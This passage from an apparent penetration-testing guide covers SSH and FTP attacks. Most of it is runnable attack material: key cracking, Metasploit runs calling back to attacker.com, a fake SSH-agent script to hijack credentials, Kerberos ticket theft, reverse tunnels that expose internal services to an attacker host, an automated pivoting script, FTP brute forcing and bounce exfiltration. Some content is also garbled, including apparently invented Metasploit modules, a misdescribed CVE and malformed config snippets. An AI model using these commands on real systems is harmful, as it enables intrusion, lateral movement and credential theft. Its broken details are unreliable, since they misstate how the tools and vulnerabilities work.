cat /etc/passwd | cut -d: -f1,6 | while read user home; do
  test -f "$home/.ssh/authorized_keys" && echo "User $user has authorized_keys"
done

# Identify backdoor SSH keys (added by attackers)
# Compare against baseline if available
# Look for recent additions: stat -c %y ~/.ssh/authorized_keys

# Monitor SSH key usage
# Enable SSH logging
cat >> /etc/ssh/sshd_config << 'EOF'
LogLevel DEBUG3
SyslogFacility AUTH
EOF

# Parse SSH logs for suspicious patterns
grep -E "Bad protocol|Invalid user|root login|Failed password" /var/log/auth.log
```

#### SSH Key Extraction and Cracking

Extract keys from memory or weak passphrases:

```bash
# Extract SSH key from memory (if process running)
# Requires process access or memory dump

# If private key has weak passphrase
ssh2john ~/.ssh/id_rsa > /tmp/id_rsa.john
john /tmp/id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt

# SSH key passphrase cracking
ssh-keyscan target.com 2>/dev/null | grep -oP 'rsa \K[^ ]*' > /tmp/pubkey.txt

# If passphrase-protected key captured
john --format=ssh private_key.pem --wordlist=passwords.txt

# Attempt SSH without passphrase (some environments allow this)
ssh-add ~/.ssh/id_rsa
# If no passphrase, key is loaded into agent
```

### SSH Version Vulnerabilities

SSH implementations contain exploitable vulnerabilities. Identifying and exploiting version-specific flaws enables access.

#### SSH Banner Grabbing

Identify SSH version and gather information:

```bash
# Connect and retrieve banner
nc -v target.com 22
# Or:
ssh -v target.com 2>&1 | grep "OpenSSH\|protocol"

# Using Metasploit scanner
msfconsole
> use auxiliary/scanner/ssh/ssh_version
> set RHOSTS target.com
> run

# Automated version detection
nmap -sV -p 22 target.com
nmap -sC -p 22 target.com  # Run SSH scripts

# SSH version from public key scan
ssh-keyscan -t rsa target.com 2>/dev/null | head -1
```

#### Known SSH Vulnerabilities

[Unverified] The following represents common SSH vulnerabilities across versions. Specific exploitation requires verification of target version and conditions.

```
OpenSSH < 3.3             → Off-by-one error in CRC32 compensation attack
OpenSSH 5.3-6.6           → GSSAPI information leak vulnerability
OpenSSH 7.4p1 → 7.7       → Privilege escalation in SSHD
OpenSSH < 7.4             → Username enumeration (timing-based)
OpenSSH 7.5p1             → Memory corruption in packet handling
Dropbear SSH              → Various versions vulnerable to DoS, RCE
PuTTY SSH client          → Key handling vulnerabilities
```

#### Exploitation Techniques

Test for known vulnerabilities:

```bash
# Username enumeration via timing (OpenSSH < 7.4)
# Invalid users respond faster than valid ones
for user in root admin test; do
  time ssh -o PasswordAuthentication=no -o ConnectTimeout=5 "$user@target.com" 2>&1 | head -1
done

# CVE-2016-10012: GSSAPI information leak
# Allows remote code execution via specially crafted GSSAPI packets
# Requires custom exploit or Metasploit module

# Test for GSSAPI vulnerability
msfconsole
> use exploit/linux/ssh/gssapi_info_leak
> set TARGET target.com
> run

# Version confusion attacks
# Send different SSH versions than expected
# Exploit implementation differences

# Weak algorithm negotiation
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 target.com
# If server accepts weak algorithms, potential downgrade attacks
```

#### Metasploit SSH Exploitation

Use Metasploit framework for SSH exploitation:

```bash
# Launch msfconsole
msfconsole

# SSH auxiliary modules
> search ssh
> use auxiliary/scanner/ssh/ssh_version
> use auxiliary/scanner/ssh/ssh_enumusers

# SSH exploitation modules
> use exploit/linux/ssh/sshd_buffer_overflow
> search gssapi
> use exploit/linux/ssh/gssapi_info_leak

# Set required options
> set RHOSTS target.com
> set USERNAME admin
> set PASSWORD password
> set LHOST attacker.com
> set LPORT 4444

# Run exploitation
> run
> exploit
```

#### Protocol-Level Attacks

Exploit SSH protocol weaknesses:

```bash
# CBC mode plaintext recovery
# Some SSH versions vulnerable to attacks on CBC cipher mode
# Manifest as information disclosure

# Man-in-the-middle attacks (if SSH keys not verified)
arpspoof -i eth0 -t target.com gateway.com
sslstrip -l 22 -p
# Intercept SSH traffic (requires network position)

# Key exchange tampering
# If weak algorithms negotiated, downgrade attacks possible
nmap -p 22 --script ssh-enum-algos target.com

# Packet injection
# Requires raw socket access or network tap
tcpdump -i eth0 -w ssh_capture.pcap 'tcp port 22'
# Edit capture and replay with scapy (advanced)
```

### SSH Agent Forwarding Abuse

SSH agent forwarding allows remote systems to use local SSH credentials. Compromise of forwarding can result in lateral movement and credential theft.

#### SSH Agent Forwarding Mechanics

Understanding how agent forwarding works:

```bash
# Enable SSH agent forwarding
ssh -A user@target.com

# SSH config enables by default in some configurations
cat ~/.ssh/config
# Agent forwarding enabled: 
#   ForwardAgent yes

# Display connected agent
echo $SSH_AUTH_SOCK
# Typical path: /tmp/ssh-XXXXXXXX/agent.XXXXX

# List identities in agent
ssh-add -l
# Shows loaded keys available to agent
```

#### Agent Socket Exploitation

Compromise of SSH agent socket allows key theft:

```bash
# Locate SSH agent socket
ls -la /tmp/ssh-*/agent.*

# If accessible (permission misconfiguration)
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh-add -l

# Dump agent credentials (requires socket access)
# Using ssh-agent-rescue or similar tools
ssh-agent-rescue -S /tmp/ssh-XXXX/agent.XXXX

# Extract private key from compromised agent
# Manual method: connect to socket and request key operations
nc -U /tmp/ssh-XXXX/agent.XXXX

# Automated extraction
python3 << 'EOF'
import socket
import sys

agent_socket = "/tmp/ssh-XXXX/agent.XXXX"
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect(agent_socket)

# SSH agent protocol: request identities
sock.send(b'\x00\x00\x00\x01\x0b')  # SSH_AGENTC_REQUEST_IDENTITIES

data = sock.recv(4096)
print(repr(data))
sock.close()
EOF
```

#### Lateral Movement via Agent Forwarding

Use compromised agent for pivoting:

```bash
# On compromised host with agent forwarding
# SSH_AUTH_SOCK is set, pointing to local machine's agent

SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh-add -l

# Connect to additional systems using forwarded credentials
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh user@internal-system.local

# Chain compromises across network
# Use agent to authenticate to systems accessible from compromised host

# Verify agent socket accessibility
stat /tmp/ssh-*/agent.*
# Check permissions: should be restrictive (600)
# World-readable sockets allow any user to use agent
```

#### Agent Hijacking

Steal SSH credentials through agent socket:

```bash
# Create fake SSH agent to intercept requests
python3 << 'EOF'
#!/usr/bin/env python3
import socket
import os
import sys

fake_agent_socket = "/tmp/fake_ssh_agent"
real_agent_socket = os.environ.get('SSH_AUTH_SOCK', '')

if os.path.exists(fake_agent_socket):
    os.remove(fake_agent_socket)

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind(fake_agent_socket)
server.listen(1)

print(f"Fake SSH agent listening on {fake_agent_socket}")
print(f"Redirect SSH_AUTH_SOCK={fake_agent_socket}")

while True:
    conn, _ = server.accept()
    try:
        data = conn.recv(1024)
        print(f"Received from client: {repr(data)}")
        
        # Forward to real agent
        if real_agent_socket:
            real_agent = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            real_agent.connect(real_agent_socket)
            real_agent.send(data)
            response = real_agent.recv(4096)
            conn.send(response)
            real_agent.close()
        else:
            conn.send(b'\x00\x00\x00\x00')  # Empty response
    except Exception as e:
        print(f"Error: {e}")
    finally:
        conn.close()
EOF

# Use on compromised system:
export SSH_AUTH_SOCK=/tmp/fake_ssh_agent
# Victim connects and credentials are logged
```

#### Protection Bypass

Exploit or bypass SSH agent protections:

```bash
# Agent confirmation (SSH_ASKPASS mechanism)
# Some agents require user confirmation for key operations
# Bypass: steal credentials before confirmation dialog appears

# Agent socket cleanup
# Leftover sockets from disconnected sessions
find /tmp -name "agent.*" -mtime +1  # Find old sockets

# Race conditions
# Potential TOCTOU vulnerabilities in agent access control

# Credential forwarding in container/VM environments
# Docker: SSH agent exposed inside container
# Kubernetes: SSH agent forwarded to pod
# Bypass network isolation by using agent to access host

# Agent forwarding via jump hosts
ssh -A -J jumphost.com target.com
# If jumphost compromised, agent socket accessible
```

#### Detection and Monitoring

Identify SSH agent abuse:

```bash
# Monitor SSH_AUTH_SOCK usage
lsof /tmp/ssh-*/agent.*

# Track SSH connections using agent
ps aux | grep ssh | grep -v grep

# Check SSH agent history
history | grep ssh-add

# SSH logs (if available)
grep -E "Accepted|agent" /var/log/auth.log

# Monitor socket creation and modification
auditctl -w /tmp -p wa -k ssh_agent_watch

# Identify stale agent sockets
find /tmp -name "agent.*" -type s -newermt "-1 hour"
```

### Kerberos SSH Exploitation

SSH integrated with Kerberos authentication enables single sign-on but introduces new attack vectors.

#### Kerberos SSH Configuration Detection

Identify Kerberos-enabled SSH services:

```bash
# Check SSH configuration for Kerberos support
grep -E "Kerberos|GSSAPI" /etc/ssh/sshd_config

# Query SSH service for Kerberos authentication support
nmap -p 22 --script ssh-auth-methods target.com

# Enumerate Kerberos realm
nslookup -type=SRV _kerberos._tcp.example.com

# Check for Kerberos tickets
klist
# If tickets exist, SSH may use them

# Active Directory integration indicators
# DNS SRV records for Kerberos services
dig SRV _kerberos._tcp.example.com
```

#### Kerberos Ticket Abuse

Exploit Kerberos authentication for SSH access:

```bash
# Obtain Kerberos ticket (if valid credentials available)
kinit username@REALM

# Verify ticket acquisition
klist

# Use ticket for SSH authentication (GSSAPI)
ssh -o GSSAPIAuthentication=yes user@target.com

# If no valid credentials but Kerberos misconfigured
# Attempt to request service ticket without prior authentication

# Forge Kerberos tickets (requires KDC compromise or offline access)
# Using kali, impacket, or mimikatz

# Create fake TGT (Ticket Granting Ticket)
python3 << 'EOF'
from impacket.krb5.asn1 import AS_REQ
# Advanced ticket forgery requires KDC key or offline hash
# Not detailed here due to complexity and system-specific requirements
EOF
```

#### GSSAPI Information Leak (CVE-2016-10012)

Exploit GSSAPI vulnerability in SSH:

```bash
# Vulnerability: GSSAPI information leak in OpenSSH
# Affects: OpenSSH < 7.4
# Impact: Remote code execution

msfconsole
> use exploit/linux/ssh/gssapi_info_leak
> set TARGET target.com
> set LHOST attacker.com
> set LPORT 4444
> run

# Manual exploitation requires crafted GSSAPI packets
# Process:
# 1. Send SSH protocol handshake
# 2. Request GSSAPI authentication
# 3. Send malformed GSSAPI token
# 4. Trigger vulnerability in token parsing
```

#### Kerberos Credential Extraction

Extract Kerberos credentials from compromised systems:

```bash
# If system compromised, extract cached tickets
klist

# Export tickets for use on attacker system
# Kerberos cache location: /tmp/krb5cc_UID

# Dump tickets from memory (Windows/Linux)
# Windows: mimikatz, ProcDump
# Linux: Extract from memory or cache files

python3 << 'EOF'
import os
import shutil

# Copy Kerberos cache
krb5_cache = os.path.expanduser("~/.krbcache")
if os.path.exists(krb5_cache):
    shutil.copy(krb5_cache, "/tmp/stolen_krb5")
    print(f"Kerberos cache copied")
EOF

# Use stolen tickets
export KRB5CCNAME=/tmp/stolen_krb5
ssh user@target.com
```

#### Delegation Attack (Constrained/Unconstrained)

[Inference] Kerberos delegation misconfiguration allows attackers to obtain tokens for arbitrary services, potentially enabling SSH access as other users.

```bash
# Detect Kerberos delegation settings
# Windows Active Directory:
# LDAP query for servicePrincipalName and msDS-AllowedToDelegateTo

# Impacket-based delegation attack
python3 << 'EOF'
from impacket.krb5.kerberosv5 import KerberosContext
# Requires deep Kerberos knowledge and access to KDC
# Typical exploit: obtain TGT → request service ticket with delegation
EOF

# Alternative: Use impacket tools
# getST.py to obtain service ticket
# export KRB5CCNAME to use ticket

# Test SSH access with delegated ticket
export KRB5CCNAME=/tmp/delegated_ticket
ssh -o GSSAPIAuthentication=yes target.com
```

#### Kerberos Downgrade Attacks

Exploit weak Kerberos implementations:

```bash
# Some SSH implementations accept weak pre-authentication
# Downgrade from PKINIT (certificate-based) to password-based

# Force DES encryption (deprecated, weak)
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 target.com

# Downgrade Kerberos version
# Intercept and modify AS-REQ to request older version

# NTLM downgrade (in mixed environments)
# If Kerberos fails, system falls back to NTLM
# NTLM is more vulnerable to attacks
```

### SSH Tunneling/Forwarding for Pivoting

SSH tunneling creates encrypted channels for accessing internal networks and systems through compromised hosts.

#### Local Port Forwarding

Create tunnels from local machine to remote network:

```bash
# Basic local port forwarding
ssh -L local_port:target_host:target_port user@gateway.com

# Example: Access internal database through SSH gateway
ssh -L 3306:internal-db.local:3306 user@gateway.com

# Connect to forwarded port
mysql -h 127.0.0.1 -P 3306 -u dbuser -p

# Multiple port forwards
ssh -L 8080:web.internal:80 -L 3306:db.internal:3306 user@gateway.com

# Persistent tunnel (no command execution, just tunnel)
ssh -N -L 8080:web.internal:80 user@gateway.com &

# Background the tunnel
ssh -f -N -L 8080:web.internal:80 user@gateway.com

# List active tunnels
netstat -tlnp | grep LISTEN
ps aux | grep ssh | grep -L grep
```

#### Remote Port Forwarding

Create reverse tunnels from remote system to attacker:

```bash
# Remote port forwarding (attacker ← compromised system)
ssh -R attacker_port:localhost:service_port attacker@attacker.com

# Example: Expose compromised system's internal service to attacker
ssh -R 8080:localhost:8080 attacker@attacker.com
# Service on compromised system accessible at attacker:8080

# Establish reverse tunnel from compromised system
# Compromised system initiates connection to attacker
ssh -f -N -R 8080:localhost:8080 -o "ServerAliveInterval=60" attacker@attacker.com

# Monitor for incoming tunnels
netstat -tlnp | grep 8080
ss -tlnp | grep LISTEN
```

#### Dynamic Port Forwarding (SOCKS Proxy)

Create SOCKS proxy for pivoting:

```bash
# Establish SOCKS proxy through SSH gateway
ssh -D local_port user@gateway.com

# Example: Create SOCKS proxy on port 9050
ssh -D 9050 user@gateway.com

# Configure tools to use SOCKS proxy
# Proxychains
cat > /etc/proxychains.conf << 'EOF'
socks5 127.0.0.1 9050
EOF

# Route traffic through proxy
proxychains nmap -sV -p 22,80,443 internal-network.local

# Browser configuration (Firefox)
# Preferences → Network → Manual proxy configuration
# SOCKS Host: 127.0.0.1, Port: 9050

# Python requests through SOCKS
python3 << 'EOF'
import requests
proxies = {
    'http': 'socks5://127.0.0.1:9050',
    'https': 'socks5://127.0.0.1:9050',
}
response = requests.get('http://internal.local', proxies=proxies)
print(response.text)
EOF

# Curl through SOCKS
curl --socks5 127.0.0.1:9050 http://internal.local
```

#### SSH Jump Hosts (ProxyJump)

Chain SSH connections through intermediate hosts:

```bash
# Single jump host
ssh -J jumphost.com target.com

# Multiple jump hosts (chained)
ssh -J jump1.com,jump2.com,jump3.com target.com

# SSH config method
cat >> ~/.ssh/config << 'EOF'
Host target
  User targetuser
  Hostname target.internal
  ProxyJump jumphost

Host jumphost
  User jumpuser
  Hostname jumphost.com
EOF

ssh target

# Copy files through jump hosts
scp -J jumphost.com file.txt user@target.com:/tmp/

# Port forwarding through jump hosts
ssh -J jumphost.com -L 3306:target.internal:3306 user@target.com

# Nested tunneling (pivot through multiple systems)
ssh -L 9050:localhost:9050 -J jump1.com,jump2.com user@jump3.com
```

#### Pivot Chains and Network Reconnaissance

Use SSH tunnels to enumerate and access internal networks:

```bash
# Establish tunnel to first compromised system
ssh -f -N -D 9050 user@compromised1.com

# Enumerate internal network through SOCKS proxy
proxychains nmap -sV --top-ports 100 -T4 192.168.1.0/24

# Identify additional systems
proxychains nbtscan 192.168.1.0/24

# Access discovered systems through tunnel
proxychains ssh -o ProxyCommand="proxychains nc %h %p" user@192.168.1.50

# Establish tunnel through compromised1 to compromised2
# Set up reverse tunnel from compromised1
ssh -R 9051:localhost:9050 user@compromised1.com

# Connect to compromised1's reverse tunnel
ssh -D 9051 localhost
# This creates nested proxy through compromised1

# Diagram of multi-level pivot:
# Attacker → Gateway (9050) → Internal System → Hidden Service
```

#### SSH Agent Forwarding for Lateral Movement

Use SSH agent forwarding to extend pivoting:

```bash
# Enable agent forwarding through jump host
ssh -A -J jumphost.com target.com

# On target system, use forwarded agent
# Local system's SSH keys available through SSH_AUTH_SOCK

SSH_AUTH_SOCK=$(find /tmp/ssh-* -name agent.\* 2>/dev/null | head -1)
export SSH_AUTH_SOCK

# Use forwarded credentials to access additional systems
ssh user@internal-system.local

# Set up SSH config for transparent agent forwarding
cat >> ~/.ssh/config << 'EOF'
Host *
  AddForwardAgent yes EOF

# Chain through multiple systems using agent forwarding

ssh -A user@compromised1.com

# Inside compromised1:

ssh -A user@compromised2.com

# Inside compromised2:

ssh -A user@compromised3.com

````

#### Network Tunnel Persistence

Maintain SSH tunnels across disconnections:

```bash
# Autossh: automatically restarts SSH tunnels
autossh -M 20000 -N -D 9050 user@gateway.com &

# Monitor tunnel status
ps aux | grep autossh

# SSH configuration for persistent tunnels
cat >> ~/.ssh/config << 'EOF'
Host gateway
  User gatewayuser
  Hostname gateway.com
  ServerAliveInterval 60
  ServerAliveCountMax 10
  ExitOnForwardFailure yes
  ControlMaster auto
  ControlPath ~/.ssh/control-%C
  ControlPersist 600
EOF

# Tunnel reconnection script
#!/bin/bash
while true; do
  ssh -N -D 9050 user@gateway.com
  sleep 5
done

# Systemd service for persistent tunnel
cat > /etc/systemd/system/ssh-tunnel.service << 'EOF'
[Unit]
Description=SSH Tunnel
After=network.target

[Service]
Type=simple
User=tunneluser
ExecStart=/usr/bin/ssh -N -D 9050 user@gateway.com
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl start ssh-tunnel
systemctl enable ssh-tunnel
````

#### Tunnel Detection and Evasion

Detect and bypass tunnel monitoring:

```bash
# Check for SSH tunnels on system
netstat -tlnp | grep ssh
ss -tlnp | grep ssh

# Monitor tunnel creation
auditctl -w /proc/net/tcp -p wa

# Evasion techniques
# 1. Use non-standard ports
ssh -D 53 user@gateway.com  # Often overlooked

# 2. Tunnel over HTTPS (if only HTTPS allowed outbound)
ssh -o ProxyCommand="curl --socks5 127.0.0.1:8080 %h:%p" user@gateway.com

# 3. Obfuscate SSH traffic
# Using ObfuscatedSSH or similar tools
# See: https://github.com/brl/obfuscated-openssh

# 4. SSH over SSH (nested encryption)
ssh -o ProxyCommand="ssh gateway.com -W %h:%p" target.com

# 5. SSH over HTTP/HTTPS proxy
ssh -o ProxyCommand="nc -X CONNECT -x proxy.com:8080 %h %p" user@gateway.com

# Detection of tunnel usage
# Monitor outbound connections
iptables -t mangle -A OUTPUT -m state --state NEW -j LOG

# DNS queries for tunneling
tcpdump -i any -A 'tcp port 53'

# Unusual port combinations
netstat -an | grep ESTABLISHED | awk '{print $4, $5}' | sort | uniq -c
```

#### Multi-Hop SSH with Port Chaining

Advanced multi-system pivoting:

```bash
# Establish complex tunnel chain
# Attacker → Jump1 (9050 SOCKS) → Jump2 (port forward) → Internal

# Step 1: Tunnel to Jump1
ssh -f -N -D 9050 user@jump1.com

# Step 2: Through Jump1, access Jump2
proxychains ssh -f -N -L 9051:jump2.com:22 user@jump1.com

# Step 3: Connect to Jump2 through Jump1's tunnel
# Configure SSH for nested proxying
cat > ~/.ssh/config << 'EOF'
Host jump1
  Hostname jump1.com
  User user
  DynamicForward 9050

Host jump2
  Hostname jump2.com
  User user
  ProxyCommand ssh -W %h:%p jump1

Host internal
  Hostname internal.local
  User user
  ProxyCommand ssh -W %h:%p jump2
EOF

# Single command to access internal system through chain
ssh internal

# File transfer through multi-hop chain
scp -o ProxyCommand="ssh -W %h:%p jump1" file.txt user@jump2.com:/tmp/
scp -o ProxyCommand="ssh -W %h:%p -o ProxyCommand='ssh -W %h:%p jump1' jump2.com" file.txt user@internal.local:/tmp/

# Diagram visualization
# Attacker → Jump1 ─┐
#                   ├─ Jump2 ─ Internal System
#           (9050)  │
#          (9051)   ┘
```

#### Automated Pivoting Framework

[Inference] Combining SSH tunnels, proxychains, and reconnaissance enables systematic network traversal and lateral movement from single compromised systems.

```bash
#!/bin/bash
# Automated SSH pivoting framework

GATEWAY=$1
TARGET_NETWORK=$2
PROXY_PORT=9050

# 1. Establish initial gateway tunnel
echo "[*] Connecting to gateway: $GATEWAY"
ssh -f -N -D $PROXY_PORT user@$GATEWAY

# 2. Verify tunnel connectivity
sleep 2
if netstat -tlnp | grep -q $PROXY_PORT; then
    echo "[+] SOCKS proxy established on port $PROXY_PORT"
else
    echo "[-] Failed to establish SOCKS proxy"
    exit 1
fi

# 3. Scan network through proxy
echo "[*] Scanning $TARGET_NETWORK through proxy"
proxychains nmap -sV --top-ports 100 -T4 $TARGET_NETWORK -oX /tmp/nmap_scan.xml

# 4. Parse results and identify targets
echo "[*] Analyzing scan results"
grep "port state open" /tmp/nmap_scan.xml | grep -oP 'addr="[^"]*"' | cut -d'"' -f2 > /tmp/targets.txt

# 5. For each target, attempt SSH access
while read target; do
    echo "[*] Attempting SSH access to $target"
    proxychains ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no user@$target "id" 2>/dev/null && \
        echo "[+] Access successful: $target" >> /tmp/compromised.txt
done < /tmp/targets.txt

# 6. Establish tunnels from newly compromised systems
while read compromised; do
    new_port=$((PROXY_PORT + 1))
    echo "[*] Setting up reverse tunnel from $compromised"
    proxychains ssh -f -N -R $new_port:localhost:$PROXY_PORT user@$compromised
done < /tmp/compromised.txt

echo "[+] Pivoting framework complete"
echo "[+] Compromised systems: $(cat /tmp/compromised.txt)"
```

#### SSH Tunnel Forensics

Analyze SSH tunnel artifacts and logs:

```bash
# Check SSH history
history | grep -E "ssh -[A-Z]|sshpass|ssh-keyscan"

# SSH command history from shell configuration
grep -E "ssh|tunnel|forward" ~/.bash_history ~/.zsh_history 2>/dev/null

# SSH agent socket history
ls -la /tmp/ssh-*/

# SSH config file analysis
cat ~/.ssh/config | grep -E "ProxyCommand|DynamicForward|LocalForward|RemoteForward"

# SSH known_hosts shows accessed systems
cat ~/.ssh/known_hosts

# Network connections during tunneling
netstat -an | grep ESTABLISHED
ss -tan | grep ESTABLISHED

# Process monitoring
ps aux | grep ssh

# Port listening during tunnels
lsof -i -P -n | grep ssh

# SSH daemon logs (if available)
grep -E "Forward|tunnel|proxy" /var/log/auth.log /var/log/secure 2>/dev/null

# System-level tunnel detection
netstat -tlnp | awk '$4 ~ /:/ && $1 == "tcp" {print $4, $7}' | grep ssh
```

This comprehensive coverage of SSH exploitation covers brute force attacks, key enumeration, version vulnerabilities, agent forwarding abuse, Kerberos integration exploits, and tunneling techniques for network pivoting. Each technique is grounded in practical tools and commands applicable in CTF scenarios and penetration testing engagements.

---

## FTP Exploitation

### Anonymous FTP Access

Anonymous FTP allows unauthenticated users to connect and access files without credentials. This commonly exposes sensitive data, configuration files, and application source code.

#### Detection and Connection

Identify FTP services running on common ports:

```bash
# Port scanning for FTP
nmap -p 21 target.com
nmap -p 21,2121,8021 target.com  # Alternative FTP ports

# Banner grabbing
nc -v target.com 21
telnet target.com 21

# Expected response format:
# 220 FTP Server Ready
# 220 Welcome to FTP Service
```

Test for anonymous access:

```bash
# Using ftp command-line client
ftp target.com
# Prompted for username
# Enter: anonymous
# Prompted for password
# Enter: anonymous@ or any email address

# If connection succeeds, anonymous FTP enabled

# Using curl (alternative)
curl -v ftp://target.com/
# If no 530 error (login required), anonymous access available
```

#### Automated Anonymous Access Enumeration

```bash
# Using Nmap NSE scripts
nmap -p 21 --script ftp-anon target.com

# Output indicates if anonymous login allowed:
# | ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

#### Directory and File Discovery

Once connected via anonymous FTP:

```bash
# List root directory
ftp> ls -la
ftp> dir

# Identify accessible directories
ftp> pwd
ftp> cd dirname

# Recursive directory listing
ftp> ls -lR

# Download files
ftp> get filename
ftp> mget *  # Download all files

# Alternative with curl
curl -v ftp://target.com/path/to/file
```

#### Sensitive Data Discovery Patterns

Common exposed directories and files:

```
/
/pub
/public
/share
/incoming
/upload
/backup
/old
/archive
/tmp
/test
/docs
/source
/scripts
/config
/.env
/config.php
/web.config
/database.sql
/dump.sql
/backup.tar.gz
/source.zip
```

Search strategies within FTP:

```bash
# Look for database backups
ftp> ls -la *.sql
ftp> ls -la *.db
ftp> ls -la *.dump

# Look for source code
ftp> ls -la *.php
ftp> ls -la *.py
ftp> ls -la *.js
ftp> ls -la *.java

# Look for archives
ftp> ls -la *.zip
ftp> ls -la *.tar.gz
ftp> ls -la *.rar

# Look for credentials/config
ftp> ls -la *.conf
ftp> ls -la *.config
ftp> ls -la *.xml
ftp> ls -la *.json
```

#### Information Extraction from Downloaded Files

```bash
# Database dumps
# Extract credentials, user data, application logic

# Source code repositories
strings extracted_files.zip | grep -i password
strings extracted_files.zip | grep -i token
strings extracted_files.zip | grep -i api_key

# Configuration files
grep -r "password\|secret\|key\|token" .

# Environment files
cat .env
# Often contains database credentials, API keys, etc.
```

#### [Inference] Hidden Directory Enumeration

If standard paths don't reveal sensitive data, use wordlists:

```bash
# Download common directory wordlist
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt

# Brute force FTP directories
for dir in $(cat common.txt); do
  ftp -n -v target.com << EOF
quote user anonymous
quote pass anonymous@
cd $dir
quit
EOF
done
```

### Brute Force FTP

When anonymous access is unavailable, attempt credential brute forcing using common username/password combinations.

#### FTP Brute Force Tools

**Using hydra:**

```bash
# Basic brute force
hydra -L usernames.txt -P passwords.txt ftp://target.com

# With specific FTP port
hydra -L usernames.txt -P passwords.txt -s 2121 ftp://target.com

# Output format:
# [21][ftp] host: target.com login: admin password: password123
```

**Using medusa:**

```bash
# Medusa FTP brute force
medusa -h target.com -u admin -P passwords.txt -M ftp

# With user list
medusa -h target.com -U usernames.txt -P passwords.txt -M ftp

# Parallel threads (faster)
medusa -h target.com -U usernames.txt -P passwords.txt -M ftp -t 10
```

**Using metasploit:**

```bash
# Launch msfconsole
msfconsole

# Use FTP auxiliary scanner
use auxiliary/scanner/ftp/ftp_login
set RHOSTS target.com
set USER_FILE /path/to/usernames.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
run

# Successful attempts displayed with valid credentials
```

#### Common Credential Dictionaries

```bash
# Curated username list
admin, ftp, root, test, guest, user, operator, supervisor, administrator

# Common password list
password, 123456, admin, welcome, ftp, test, Pass@123, letmein, qwerty

# Generate custom wordlist based on target
# Organization name variations
# Common naming patterns
# Default device passwords
```

#### Wordlist Generation

```bash
# Using crunch for pattern-based generation
crunch 6 8 '0123456789abcdefghijklmnopqrstuvwxyz' -t ftp_%%%%

# Using john for password variations
john --wordlist=base-wordlist.txt --rules --stdout > expanded-wordlist.txt

# Using sed for pattern manipulation
sed 's/^/admin_/' base-wordlist.txt

# Combine multiple wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt
```

#### Brute Force Optimization

```bash
# FTP response times indicate valid/invalid credentials
# Valid credentials: typically 230 Login successful
# Invalid credentials: typically 530 Login incorrect

# Reduce noise with grep filtering
hydra -L usernames.txt -P passwords.txt ftp://target.com 2>&1 | grep "login:"

# Target specific high-probability credentials first
# admin, root, ftp-user, test, service accounts

# Check default credentials before brute forcing
```

#### Post-Brute Force Access

Once valid credentials obtained:

```bash
# Connect with discovered credentials
ftp target.com
# Username: admin
# Password: password123

# Enumerate accessible files
ftp> ls -la
ftp> pwd
ftp> cd ../

# Download sensitive files
ftp> mget *

# Identify file permissions and ownership
ftp> ls -l
# Reveals which users can read/write/execute files
```

### FTP Bounce Attacks

FTP bounce attacks exploit the FTP PORT command to initiate connections from the FTP server to arbitrary hosts. This bypasses firewall restrictions and allows port scanning or data exfiltration through the FTP server.

#### FTP Protocol Mechanics

FTP operates in two modes:

**Active Mode:**

- Client connects to FTP server on port 21 (control connection)
- Client sends PORT command specifying IP and port for data transfer
- FTP server initiates connection from port 20 to client's specified address/port

**Passive Mode:**

- Server specifies port for data transfer
- Client initiates connection to that port

The PORT command vulnerability allows specifying arbitrary target hosts.

#### Bounce Attack Reconnaissance

```bash
# PORT command format: PORT h1,h2,h3,h4,p1,p2
# Where h1.h2.h3.h4 is target IP, p1*256+p2 is target port

# Example: Scan port 80 on 192.168.1.50
# PORT 192,168,1,50,0,80

# Connect to vulnerable FTP server
ftp target.com

# Send PORT command (if accepted, bounce possible)
quote PORT 192,168,1,50,0,80

# Send LIST command to trigger connection
list
# If connection succeeds, FTP server connects to target:80

# Response format indicates port state:
# 150 Opening data connection
# indicates target port responding
```

#### Automated Bounce Attack Scanning

```bash
# Using nmap
nmap -b ftp-server-ip:username:password target.com -p port

# Example: Scan using anonymous FTP bounce
nmap -b ftp://anonymous:anonymous@ftp.target.com:21 192.168.1.50 -p 22,80,443

# Output shows scanned ports, attribution obscured (appears from FTP server)
```

#### Manual Bounce Attack Execution

```bash
# Script to perform FTP bounce attack
#!/bin/bash

FTP_SERVER="ftp.target.com"
TARGET_IP="192.168.1.50"
TARGET_PORT="80"

# Convert IP to comma notation
IP_COMMAS=$(echo $TARGET_IP | sed 's/\./,/g')
# Convert port to two-byte notation
PORT_HIGH=$((TARGET_PORT / 256))
PORT_LOW=$((TARGET_PORT % 256))

# Connect and send PORT command
ftp -n $FTP_SERVER << EOF
quote user anonymous
quote pass anonymous@
quote PORT $IP_COMMAS,$PORT_HIGH,$PORT_LOW
list
quit
EOF
```

#### [Unverified] Modern FTP Bounce Limitations

Modern FTP servers implement anti-bounce protections:

```bash
# Common protections:
# - PORT command only allows FTP server's own IP
# - Disallow PORT commands entirely (force PASV)
# - Filter private IP ranges in PORT commands
# - Log and alert on suspicious PORT usage
```

Test FTP server version and capabilities:

```bash
# Banner information indicates OS/FTP software
nc -v ftp.target.com 21
# 220 ProFTPD 1.3.4 Server (example)

# Research known vulnerabilities for that version
# Older versions more likely to support bounce attacks
```

#### FTP Bounce Data Exfiltration

If bounce attack succeeds, use it to exfiltrate data:

```bash
# Retrieve file from FTP server via bounce
# Use PORT command to direct data to attacker server

# Attacker sets up listener on specific port
nc -l -p 12345

# On FTP server, use PORT to direct data to attacker:12345
# Send RETR filename command

# Data streams through FTP bounce to attacker's listener
```

### Weak Permissions Abuse

FTP directories and files often have overly permissive access controls, allowing unauthorized read, write, or execute operations.

#### Permission Analysis

```bash
# FTP file listing displays permissions (Unix-style)
ftp> ls -l

# Output format: -rwxrwxrwx owner group size date name
